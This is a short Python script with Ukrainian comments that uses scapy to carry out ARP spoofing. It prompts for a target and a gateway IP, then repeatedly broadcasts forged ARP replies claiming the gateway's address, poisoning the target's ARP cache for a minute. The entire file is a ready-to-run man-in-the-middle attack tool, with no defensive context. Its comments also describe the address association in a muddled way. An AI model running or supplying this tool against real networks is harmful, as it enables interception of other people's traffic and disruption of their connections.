from scapy.all import ARP, Ether, send
import time


def arp_spoof(target_ip, gateway_ip):
    """
    Виконує ARP-спуфінг: посилає фальшиві ARP-пакети.

    :param target_ip: IP-адреса цілі (машина, яку ми хочемо обдурити).
    :param gateway_ip: IP-адреса шлюзу (маршрутизатора).
    """
    # Створюємо ARP-пакет для фальшивого асоціювання IP цілі з MAC-адресою шлюзу
    arp_response = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC
    ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff") / arp_response  # Ethernet заголовок
    send(ether_frame, verbose=False)
    print(f"Виконано ARP-спуфінг на {target_ip} для обдурення шлюзу {gateway_ip}")


def start_spoofing(target_ip, gateway_ip, duration=60):
    """
    Починає ARP-спуфінг для заданої тривалості.

    :param target_ip: IP-адреса цілі.
    :param gateway_ip: IP-адреса шлюзу.
    :param duration: Тривалість атаки в секундах.
    """
    end_time = time.time() + duration
    while time.time() < end_time:
        arp_spoof(target_ip, gateway_ip)
        time.sleep(2)  # Чекати 2 секунди між спуфінгами


if __name__ == "__main__":
    target_ip = input("Введіть IP-адресу цілі: ")
    gateway_ip = input("Введіть IP-адресу шлюзу: ")

    # Запускаємо ARP-спуфінг на 60 секунд (це можна змінити)
    print("ARP-спуфінг розпочато!")
    start_spoofing(target_ip, gateway_ip, duration=60)
    print("ARP-спуфінг завершено.")

print("Програма завершена. Натисніть Enter для виходу...")
input()